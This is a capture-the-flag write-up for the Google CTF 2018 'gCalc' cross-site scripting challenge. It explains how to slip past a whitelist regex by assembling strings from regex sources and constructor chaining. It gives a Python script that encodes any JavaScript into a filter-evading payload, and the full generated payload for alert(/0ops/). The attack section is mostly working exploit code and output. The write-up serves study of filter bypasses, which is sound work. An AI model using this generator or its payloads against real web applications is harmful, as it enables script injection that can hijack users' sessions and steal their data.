# gCalc

`Author: SYM01`

gCalc is an XSS challenge in Google CTF 2018. The details can be referred to the [Orange's blog](http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html).

Orange's solution is concise and powerful. But I use another way to build the payload, a more complex one.

## How?
Focus on the following regex:
```javascript
/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/
```
We can use `/`, `+`,  `(`, `)`, any number and any lowercase words leading with `.`. It's enough for us to build the payload.

Examples:

```javascript
// to get "return "
/.return /.source.substr(1)

// to get "C"
/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift()

// to get "String.fromCharCode(48)"
/(0+(1.zthis)).constructor.from.yhar.yode(48)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())
```

We can finally invoke `String.fromCharCode()`.

On the basis of the above, we can build any payloads.


## Exploit
We use the following script to generate the final payload.
```python
#!/usr/bin/env python3
import sys

fromCharCode_tpl = r'/(0+(1.zthis)).constructor.from.yhar.yode({})/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())'

sep = r'+/1+/.source.substr(1)+'

def encode(c:str)->str:
     return fromCharCode_tpl.format(ord(c))

payload = sep.join(map(encode, sys.argv[1]))

print(r'/0/.constructor.constructor(/0/.constructor.constructor(/.return /.source.substr(1)+{})())()'.format(payload))
```

By using the upper script, we can generate the payload for `alert(/0ops/)`:
```javascript
/0/.constructor.constructor(/0/.constructor.constructor(/.return /.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(97)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(108)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(101)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(114)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(116)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(40)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(47)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(48)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(111)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(112)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(115)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(47)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift())+/1+/.source.substr(1)+/(0+(1.zthis)).constructor.from.yhar.yode(41)/.source.split(/.z/).join().split(/.y/).join(/0/.constructor.constructor(/.return /.source.substr(1)+/.escape((1+(1.zthis)).sub())/.source.split(/.z/).join().substr(1))().substr(2).split(/.u/).shift()))())()
```
It's quite annoying. XD.